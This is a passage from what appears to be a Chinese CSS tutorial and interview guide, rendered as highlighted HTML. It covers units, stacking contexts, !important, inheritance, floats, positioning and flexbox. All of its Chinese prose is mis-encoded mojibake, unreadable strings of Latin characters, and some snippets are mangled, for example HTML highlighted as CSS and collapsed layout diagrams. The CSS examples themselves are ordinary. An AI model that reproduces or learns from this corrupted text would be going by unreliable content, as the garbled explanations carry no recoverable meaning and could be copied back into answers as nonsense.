emï¼‰</strong></p><ul><li>è®¡ç®—è§„åˆ™ï¼š<code>1rem = æ ¹å…ƒç´  font-size</code></li></ul><p><strong>vw&#x2F;vhï¼ˆè§†å£å•ä½ï¼‰</strong></p><ul><li>è®¡ç®—è§„åˆ™ï¼š<code>1vw = è§†å£å®½åº¦çš„ 1%</code>ï¼Œ<code>1vh = è§†å£é«˜åº¦çš„ 1%</code></li><li>é™·é˜±ï¼šç§»åŠ¨ç«¯vhåŒ…å«æµè§ˆå™¨å·¥å…·æ åŒºåŸŸï¼ˆå¯ç”¨dvhå•ä½è§£å†³ï¼‰</li></ul><p><strong>%ï¼ˆç™¾åˆ†æ¯”ï¼‰</strong></p><ul><li><p>å‚ç…§åŸºå‡†ï¼š</p><table><thead><tr><th align="left">å±æ€§</th><th align="left">å‚ç…§å¯¹è±¡</th></tr></thead><tbody><tr><td align="left">width&#x2F;height</td><td align="left">çˆ¶å…ƒç´ çš„å†…å®¹åŒºå®½åº¦&#x2F;é«˜åº¦</td></tr><tr><td align="left">padding&#x2F;margin</td><td align="left">çˆ¶å…ƒç´ çš„å†…å®¹åŒºå®½åº¦</td></tr><tr><td align="left">top&#x2F;left</td><td align="left">åŒ…å«å—çš„é«˜åº¦&#x2F;å®½åº¦</td></tr></tbody></table></li><li><p>ç»å…¸é¢è¯•é¢˜</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10%</span>;<br>&#125;<br><span class="hljs-comment">/* å®é™…paddingå€¼ä¸º20pxï¼ˆåŸºäºçˆ¶å…ƒç´ widthè®¡ç®—ï¼‰ */</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="1-5-å±‚å ä¸ç»§æ‰¿ï¼ˆz-indexã€-importantã€ç»§æ‰¿è§„åˆ™ï¼‰"><a href="#1-5-å±‚å ä¸ç»§æ‰¿ï¼ˆz-indexã€-importantã€ç»§æ‰¿è§„åˆ™ï¼‰" class="headerlink" title="1.5 å±‚å ä¸ç»§æ‰¿ï¼ˆz-indexã€!importantã€ç»§æ‰¿è§„åˆ™ï¼‰"></a>1.5 å±‚å ä¸ç»§æ‰¿ï¼ˆz-indexã€!importantã€ç»§æ‰¿è§„åˆ™ï¼‰</h2><h3 id="å±‚å ä¸Šä¸‹æ–‡çš„æ ¸å¿ƒåŸç†"><a href="#å±‚å ä¸Šä¸‹æ–‡çš„æ ¸å¿ƒåŸç†" class="headerlink" title="å±‚å ä¸Šä¸‹æ–‡çš„æ ¸å¿ƒåŸç†"></a>å±‚å ä¸Šä¸‹æ–‡çš„æ ¸å¿ƒåŸç†</h3><p><strong>å½¢æˆæ¡ä»¶ï¼ˆè§¦å‘ BFC çš„å‡çº§ç‰ˆï¼‰</strong></p><ul><li>position: relative&#x2F;absolute&#x2F;fixed + z-index â‰  auto</li><li>opacity &lt; 1</li><li>transform&#x2F;filter é none</li><li>flex&#x2F;gridå®¹å™¨çš„å­é¡¹ä¸”z-index â‰  auto</li></ul><p><strong>é»„é‡‘è§„åˆ™</strong></p><ul><li>æ¯ä¸ªå±‚å ä¸Šä¸‹æ–‡è‡ªæˆä½“ç³»ï¼ˆå†…éƒ¨ z-index ä»…åœ¨è¯¥ä¸Šä¸‹æ–‡ä¸­æ¯”è¾ƒï¼‰</li><li>å…„å¼Ÿå…ƒç´ æŒ‰ z-index æ•°å€¼æ’åº</li><li>ä¸åŒä¸Šä¸‹æ–‡çš„æ¯”è¾ƒå–å†³äºçˆ¶çº§å±‚å ä¸Šä¸‹æ–‡çš„å±‚çº§</li></ul><p><strong>ç¤ºä¾‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div style=&quot;position: relative; z-index: 1;&quot;&gt;<br>  &lt;div style=&quot;position: absolute; z-index: 100;&quot;&gt;A&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;div style=&quot;position: relative; z-index: 2;&quot;&gt;<br>  &lt;div style=&quot;position: absolute; z-index: 1;&quot;&gt;B&lt;/div&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆæ˜¾ç¤ºé¡ºåºï¼šB è¦†ç›– Aï¼ˆçˆ¶çº§ä¸Šä¸‹æ–‡ z-index: 2 &gt; 1ï¼‰</p><h3 id="important-ç»ˆææƒé‡"><a href="#important-ç»ˆææƒé‡" class="headerlink" title="!important ç»ˆææƒé‡"></a>!important ç»ˆææƒé‡</h3><p><strong>æƒé‡ç­‰çº§è¡¨</strong></p><table><thead><tr><th align="left">æ¥æº</th><th align="left">ç¤ºä¾‹</th><th align="left">æƒé‡å€¼</th></tr></thead><tbody><tr><td align="left">ç”¨æˆ·ä»£ç†!important</td><td align="left">æµè§ˆå™¨é»˜è®¤æ ·å¼</td><td align="left">âˆ+3</td></tr><tr><td align="left">ç”¨æˆ·!important</td><td align="left">ç”¨æˆ·è‡ªå®šä¹‰æ ·å¼è¡¨</td><td align="left">âˆ+2</td></tr><tr><td align="left">ä½œè€…!important</td><td align="left">å¼€å‘è€…å†™çš„!important</td><td align="left">âˆ+1</td></tr><tr><td align="left">åŠ¨ç”»å…³é”®å¸§</td><td align="left">@keyframes</td><td align="left">âˆ</td></tr><tr><td align="left">æ™®é€šä½œè€…å£°æ˜</td><td align="left">å¸¸è§„CSSè§„åˆ™</td><td align="left">æŒ‰é€‰æ‹©å™¨æƒé‡</td></tr></tbody></table><p><strong>ç ´è§£ !important</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* åŸå§‹é—®é¢˜æ ·å¼ */</span><br><span class="hljs-selector-class">.btn</span> &#123; <span class="hljs-attribute">color</span>: red <span class="hljs-meta">!important</span>; &#125;<br><br><span class="hljs-comment">/* è§£å†³æ–¹æ¡ˆ1ï¼šæ›´é«˜æƒé‡!important */</span><br><span class="hljs-selector-tag">html</span> <span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.btn</span> &#123; <span class="hljs-attribute">color</span>: blue <span class="hljs-meta">!important</span>; &#125;<br><br><span class="hljs-comment">/* è§£å†³æ–¹æ¡ˆ2ï¼šJavaScriptä¿®æ”¹å†…è”æ ·å¼ */</span><br>element<span class="hljs-selector-class">.style</span><span class="hljs-selector-class">.setProperty</span>(&#x27;<span class="hljs-attribute">color</span>&#x27;, &#x27;green&#x27;, &#x27;important&#x27;);<br></code></pre></td></tr></table></figure><h3 id="ç»§æ‰¿è§„åˆ™"><a href="#ç»§æ‰¿è§„åˆ™" class="headerlink" title="ç»§æ‰¿è§„åˆ™"></a>ç»§æ‰¿è§„åˆ™</h3><p><strong>å¯ç»§æ‰¿å±æ€§æ¸…å•</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">- æ–‡æœ¬ç›¸å…³ï¼š`font-family`, `color`, `line-height`<br>- åˆ—è¡¨ç›¸å…³ï¼š`list-style-type`<br>- è¡¨æ ¼ç›¸å…³ï¼š`border-collapse`<br>- å¯è§æ€§ï¼š`visibility`<br>- å…‰æ ‡ï¼š`cursor`<br></code></pre></td></tr></table></figure><p><strong>æ˜¾å¼ç»§æ‰¿æŠ€å·§</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.ant-input</span> &#123;<br>  <span class="hljs-attribute">font</span>: inherit;  <span class="hljs-comment">/* å¼ºåˆ¶ç»§æ‰¿çˆ¶å…ƒç´ å­—ä½“è®¾ç½® */</span><br>  <span class="hljs-attribute">color</span>: inherit;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç»§æ‰¿é“¾ä¸­æ–­åœºæ™¯</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div style=&quot;font-size: 16px;&quot;&gt;<br>  &lt;span style=&quot;font-size: 1.5em;&quot;&gt;24px&lt;/span&gt;<br>  &lt;!-- å­å…ƒç´ è®¾ç½®éç»§æ‰¿å±æ€§å¦‚widthä¼šä¸­æ–­ --&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬äºŒç« ï¼šCSS-å¸ƒå±€æŠ€æœ¯"><a href="#ç¬¬äºŒç« ï¼šCSS-å¸ƒå±€æŠ€æœ¯" class="headerlink" title="ç¬¬äºŒç« ï¼šCSS å¸ƒå±€æŠ€æœ¯"></a>ç¬¬äºŒç« ï¼šCSS å¸ƒå±€æŠ€æœ¯</h1><h2 id="2-1-ä¼ ç»Ÿå¸ƒå±€ï¼ˆæµ®åŠ¨-floatã€å®šä½-positionï¼‰"><a href="#2-1-ä¼ ç»Ÿå¸ƒå±€ï¼ˆæµ®åŠ¨-floatã€å®šä½-positionï¼‰" class="headerlink" title="2.1 ä¼ ç»Ÿå¸ƒå±€ï¼ˆæµ®åŠ¨ floatã€å®šä½ positionï¼‰"></a>2.1 ä¼ ç»Ÿå¸ƒå±€ï¼ˆæµ®åŠ¨ floatã€å®šä½ positionï¼‰</h2><h3 id="æµ®åŠ¨å¸ƒå±€ï¼ˆfloatï¼‰"><a href="#æµ®åŠ¨å¸ƒå±€ï¼ˆfloatï¼‰" class="headerlink" title="æµ®åŠ¨å¸ƒå±€ï¼ˆfloatï¼‰"></a>æµ®åŠ¨å¸ƒå±€ï¼ˆfloatï¼‰</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.float-item</span> &#123;<br>  <span class="hljs-attribute">float</span>: left | right | none;<br>  <span class="hljs-attribute">clear</span>: both | left | right; <span class="hljs-comment">/* æ¸…é™¤æµ®åŠ¨å½±å“ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒæœºåˆ¶</strong></p><ul><li>æ–‡æ¡£æµç ´åï¼šæµ®åŠ¨å…ƒç´ ä¼šè„±ç¦»æ™®é€šæµï¼Œå…¶ä»–ç›’å­ä¼šâ€œæ— è§†å®ƒâ€ï¼ˆä½†æ–‡æœ¬å†…å®¹ä¼šå›´ç»•ï¼‰</li><li>åŒ…è£¹æ€§ï¼šæµ®åŠ¨å…ƒç´ ä¼šé»˜è®¤æ”¶ç¼©å®½åº¦ä»¥é€‚åº”å†…å®¹ï¼ˆé™¤éæ˜¾å¼è®¾ç½®å®½åº¦ï¼‰</li></ul><p><strong>ç»å…¸åº”ç”¨åœºæ™¯</strong></p><p>ï¼ˆ1ï¼‰å¤šæ å¸ƒå±€ï¼ˆæ—©æœŸå®ç°æ–¹å¼ï¼‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.left-col</span> &#123; <span class="hljs-attribute">float</span>: left; <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>; &#125;<br><span class="hljs-selector-class">.right-col</span> &#123; <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">210px</span>; &#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å›¾æ–‡æ··æ’</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">img</span> &#123;<br>  <span class="hljs-attribute">float</span>: left;<br>  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">15px</span>;<br>  <span class="hljs-attribute">shape-outside</span>: <span class="hljs-built_in">circle</span>(); <span class="hljs-comment">/* é«˜çº§æ–‡å­—ç¯ç»• */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é™·é˜±ï¼šé«˜åº¦å¡Œé™·é—®é¢˜</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS">&lt;<span class="hljs-selector-tag">div</span> class=&quot;parent&quot;&gt;<br>  &lt;<span class="hljs-selector-tag">div</span> class=&quot;<span class="hljs-attribute">float</span>-child&quot;&gt;&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;!-- parenté«˜åº¦ä¸º<span class="hljs-number">0</span> --&gt;<br></code></pre></td></tr></table></figure><h3 id="å®šä½å¸ƒå±€ï¼ˆpositionï¼‰-ç²¾å‡†æ§åˆ¶çš„åˆ©å™¨"><a href="#å®šä½å¸ƒå±€ï¼ˆpositionï¼‰-ç²¾å‡†æ§åˆ¶çš„åˆ©å™¨" class="headerlink" title="å®šä½å¸ƒå±€ï¼ˆpositionï¼‰ - ç²¾å‡†æ§åˆ¶çš„åˆ©å™¨"></a>å®šä½å¸ƒå±€ï¼ˆpositionï¼‰ - ç²¾å‡†æ§åˆ¶çš„åˆ©å™¨</h3><p><strong>å„å¤§å®šä½ç±»å‹å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">è„±ç¦»æ–‡æ¡£æµ</th><th align="left">å®šä½åŸºå‡†</th><th align="left">å…¸å‹åº”ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">static</td><td align="left">å¦</td><td align="left">æ­£å¸¸æµ</td><td align="left">é»˜è®¤å€¼</td></tr><tr><td align="left">relative</td><td align="left">å¦</td><td align="left">è‡ªèº«åŸå§‹ä½ç½®</td><td align="left">å¾®è°ƒå…ƒç´ &#x2F;å»ºç«‹å®šä½ä¸Šä¸‹æ–‡</td></tr><tr><td align="left">absolute</td><td align="left">æ˜¯</td><td align="left">æœ€è¿‘éstaticç¥–å…ˆ</td><td align="left">å¼¹çª—&#x2F;ä¸‹æ‹‰èœå•&#x2F;å·¥å…·æç¤º</td></tr><tr><td align="left">fixed</td><td align="left">æ˜¯</td><td align="left">è§†å£</td><td align="left">å›ºå®šå¯¼èˆªæ &#x2F;æ‚¬æµ®æŒ‰é’®</td></tr><tr><td align="left">sticky</td><td align="left">æ˜¯ï¼ˆæ»šåŠ¨æ—¶ï¼‰</td><td align="left">æœ€è¿‘æ»šåŠ¨å®¹å™¨</td><td align="left">å¸é¡¶æ•ˆæœ&#x2F;è¡¨å¤´å›ºå®š</td></tr></tbody></table><p><strong>ç²˜æ€§å®šä½ï¼ˆstickyï¼‰çš„é˜ˆå€¼æ§åˆ¶</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.sticky-header</span> &#123;<br>  <span class="hljs-attribute">position</span>: sticky;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">20px</span>; <span class="hljs-comment">/* è·ç¦»è§†å£é¡¶éƒ¨20pxæ—¶è§¦å‘å›ºå®š */</span><br>  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤±æ•ˆæ¡ä»¶ï¼š</p><ul><li>çˆ¶å…ƒç´ è®¾ç½® overflow: hidden</li><li>æœªæŒ‡å®š top&#x2F;bottom&#x2F;left&#x2F;right ä»»ä¸€å€¼</li></ul><h2 id="2-2-Flex-å¼¹æ€§å¸ƒå±€ï¼ˆflex-directionã€justify-contentã€align-itemsï¼‰"><a href="#2-2-Flex-å¼¹æ€§å¸ƒå±€ï¼ˆflex-directionã€justify-contentã€align-itemsï¼‰" class="headerlink" title="2.2 Flex å¼¹æ€§å¸ƒå±€ï¼ˆflex-directionã€justify-contentã€align-itemsï¼‰"></a>2.2 Flex å¼¹æ€§å¸ƒå±€ï¼ˆflex-directionã€justify-contentã€align-itemsï¼‰</h2><p>flex å¼¹æ€§å¸ƒå±€æœ€æ ¸å¿ƒçš„ä¸‰è¦ç´ ï¼š</p><ul><li>flex-direction</li><li>justify-content</li><li>align-items</li></ul><h3 id="flex-direction-ä¸»è½´æ–¹å‘æ§åˆ¶"><a href="#flex-direction-ä¸»è½´æ–¹å‘æ§åˆ¶" class="headerlink" title="flex-direction - ä¸»è½´æ–¹å‘æ§åˆ¶"></a>flex-direction - ä¸»è½´æ–¹å‘æ§åˆ¶</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* å“åº”å¼å¸ƒå±€åˆ‡æ¢ */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">flex-direction</span>: row;   <span class="hljs-comment">/* æ¡Œé¢ç«¯ */</span><br>&#125;<br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">flex-direction</span>: column; <span class="hljs-comment">/* ç§»åŠ¨ç«¯ */</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä½œç”¨</strong>ï¼šå®šä¹‰ Flex å®¹å™¨çš„ä¸»è½´æ–¹å‘ï¼Œç›´æ¥å½±å“å­é¡¹çš„æ’åˆ—æ–¹å¼</p><p><strong>å±æ€§è¯¦è§£</strong></p><table><thead><tr><th align="left">å±æ€§å€¼</th><th align="left">æ•ˆæœå›¾ç¤º</th><th align="left">å…¸å‹åº”ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">rowï¼ˆé»˜è®¤ï¼‰</td><td align="left">â†’ â†’ â†’ â†’</td><td align="left">æ°´å¹³å¯¼èˆªæ &#x2F;å•†å“åˆ—è¡¨</td></tr><tr><td align="left">row-reverse</td><td align="left">â† â† â† â†</td><td align="left">ä»å³åˆ°å·¦çš„ç‰¹æ®Šå¸ƒå±€éœ€æ±‚</td></tr><tr><td align="left">column</td><td align="left">â†“</td><td align="left">ç§»åŠ¨ç«¯å‚ç›´èœå•&#x2F;ç€‘å¸ƒæµ</td></tr><tr><td align="left">column-reverse</td><td align="left">â†‘</td><td align="left">èŠå¤©æ¶ˆæ¯æ—¶é—´å€’åºå±•ç¤º</td></tr></tbody></table><h3 id="justify-content-ä¸»è½´å¯¹é½æ–¹å¼"><a href="#justify-content-ä¸»è½´å¯¹é½æ–¹å¼" class="headerlink" title="justify-content - ä¸»è½´å¯¹é½æ–¹å¼"></a>justify-content - ä¸»è½´å¯¹é½æ–¹å¼</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* è¡¨æ ¼å·¥å…·æ å¸ƒå±€ */</span><br><span class="hljs-selector-class">.toolbar</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">justify-content</span>: space-between; <span class="hljs-comment">/* å·¦å³åˆ†ç»„ */</span><br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">16px</span>;<br>&#125;<br><br><span class="hljs-comment">/* å¼¹æ€§ç½‘æ ¼å¸ƒå±€ */</span><br><span class="hljs-selector-class">.grid</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>  <span class="hljs-attribute">justify-content</span>: space-around; <span class="hljs-comment">/* å¡ç‰‡å››å‘¨ç•™ç™½å‡åŒ€ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä½œç”¨</strong>ï¼šæ§åˆ¶å­é¡¹åœ¨ä¸»è½´ä¸Šçš„å¯¹é½ä¸ç©ºé—´åˆ†é…</p><p><strong>å±æ€§è¯¦è§£</strong></p><table><thead><tr><th align="left">å±æ€§å€¼</th><th align="left">æ•ˆæœå›¾ç¤º</th><th align="left">ç©ºé—´åˆ†é…è§„åˆ™</th></tr></thead><tbody><tr><td align="left">flex-start</td><td align="left">[â–  â–  â– ]________</td><td align="left">å‘ä¸»è½´èµ·ç‚¹èšé›†ï¼ˆé»˜è®¤ï¼‰</td></tr><tr><td align="left">flex-end</td><td align="left">________[â–  â–  â– ]</td><td align="left">å‘ä¸»è½´ç»ˆç‚¹èšé›†</td></tr><tr><td align="left">center</td><td align="left"><code>____[â–  â–  â– ]____</code></td><td align="left">å±…ä¸­æ’åˆ—</td></tr><tr><td align="left">space-between</td><td align="left">[â– ][â– ][â– ]</td><td align="left">é¦–å°¾è´´è¾¹ï¼Œä¸­é—´å‡åˆ†</td></tr><tr><td align="left">space-around</td><td align="left">[â– ][â– ][â– ]</td><td align="left">æ¯ä¸ªé¡¹ç›®ä¸¤ä¾§é—´è·ç›¸ç­‰</td></tr><tr><td align="left">space-evenly</td><td align="left">[â– ][â– ][â– ]</td><td align="left">é¡¹ç›®ä¸å®¹å™¨é—´è·å®Œå…¨å‡åˆ†</td></tr></tbody></table><h3 id="align-items-äº¤å‰è½´å¯¹é½æ–¹å¼"><a href="#align-items-äº¤å‰è½´å¯¹é½æ–¹å¼" class="headerlink" title="align-items - äº¤å‰è½´å¯¹é½æ–¹å¼"></a>align-items - äº¤å‰è½´å¯¹é½æ–¹å¼</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* è¡¨å•è¾“å…¥è¡Œå¯¹é½ */</span><br><span class="hljs-selector-class">.form-row</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: baseline; <span class="hljs-comment">/* è®©labelå’Œinputæ–‡å­—åŸºçº¿å¯¹é½ */</span><br>&#125;<br><br><span class="hljs-comment">/* å‚ç›´å±…ä¸­ç»ˆææ–¹æ¡ˆ */</span><br><span class="hljs-selector-class">.modal</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: center;<br>  <span class="hljs-attribute">justify-content</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä½œç”¨</strong>ï¼šæ§åˆ¶å­é¡¹åœ¨äº¤å‰è½´ä¸Šçš„å¯¹é½æ–¹å¼ï¼ˆå•è¡Œå¸ƒå±€ï¼‰</p><p><strong>å±æ€§è¯¦è§£</strong></p><table><thead><tr><th align="left">å±æ€§å€¼</th><th align="left">å¯¹é½è§„åˆ™</th></tr></thead><tbody><tr><td align="left">stretchï¼ˆé»˜è®¤ï¼‰</td><td align="left">æ‹‰ä¼¸å¡«æ»¡å®¹å™¨é«˜åº¦</td></tr><tr><td align="left">flex-start</td><td align="left">å‘äº¤å‰è½´èµ·ç‚¹å¯¹é½</td></tr><tr><td align="left">flex-end</td><td align="left">å‘äº¤å‰è½´ç»ˆç‚¹å¯¹é½</td></tr><tr><td align="left">center</td><td align="left">å±…ä¸­å¯¹é½</td></tr><tr><td align="left">baseline</td><td align="left">æŒ‰æ–‡æœ¬åŸºçº¿å¯¹é½</td></tr></tbody></table><h3 id="ä¸‰å±æ€§è”è°ƒå®è·µ"><a href="#ä¸‰å±æ€§è”è°ƒå®è·µ" class="headerlink" title="ä¸‰å±æ€§è”è°ƒå®è·µ"></a>ä¸‰å±æ€§è”è°ƒå®è·µ</h3><p>ï¼ˆ1ï¼‰åœ£æ¯å¸ƒå±€å®ç°</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.holy-grail</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-direction</span>: column;<br>  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span>, <span class="hljs-selector-class">.footer</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> auto;<br>&#125;<br><span class="hljs-selector-class">.content</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-direction</span>: row;<br>&#125;<br><span class="hljs-selector-class">.main</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-selector-class">.sidebar</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">order</span>: -<span class="hljs-number">1</span>; <span class="hljs-comment">/* å·¦ä¾§è¾¹æ  */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ç­‰é«˜å¡ç‰‡ç»„</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card-group</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: stretch; <span class="hljs-comment">/* å…³é”®è®¾ç½® */</span><br>&#125;<br><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">/* æ— éœ€è®¾ç½®é«˜åº¦ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜"><a href="#é«˜é¢‘é¢è¯•é¢˜" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜"></a>é«˜é¢‘é¢è¯•é¢˜</h3><p>ï¼ˆ1ï¼‰justify-content: space-between æœ€åä¸€è¡Œå·¦å¯¹é½æ€ä¹ˆå®ç°ï¼Ÿ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.grid</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>  <span class="hljs-attribute">justify-content</span>: space-between;<br>&#125;<br><span class="hljs-comment">/* æ·»åŠ å ä½å…ƒç´  */</span><br><span class="hljs-selector-class">.grid</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">flex</span>: auto; <span class="hljs-comment">/* æˆ–å›ºå®šå®½åº¦ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å¦‚ä½•è®© flex é¡¹ç›®åœ¨äº¤å‰æ–¹å‘ä¸Šæº¢å‡ºå®¹å™¨ï¼Ÿ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: flex-start; <span class="hljs-comment">/* å…³é”®è®¾ç½® */</span><br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰flex 